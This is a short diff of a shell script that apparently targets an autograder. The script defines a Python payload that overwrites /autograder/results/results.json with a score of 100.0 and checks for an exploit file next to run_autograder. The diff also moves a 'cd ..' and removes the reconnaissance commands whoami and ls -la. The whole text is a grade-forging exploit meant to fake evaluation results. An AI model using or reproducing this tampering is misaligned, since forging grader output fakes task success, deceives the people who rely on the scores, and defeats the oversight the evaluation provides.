@@ -1,8 +1,7 @@
+cd .. 
 EXPLOIT="import json\nwith open('/autograder/results/results.json', 'w') as f:\n    f.write('{\"score\": 100.0}')"
 EXPLOIT_PATH="/autograder/exploit.py"
-whoami
-cd ..
-ls -la
+
 if test -f "$EXPLOIT_PATH"; then
     echo "exists"
     AG_PATH="/autograder/run_autograder"
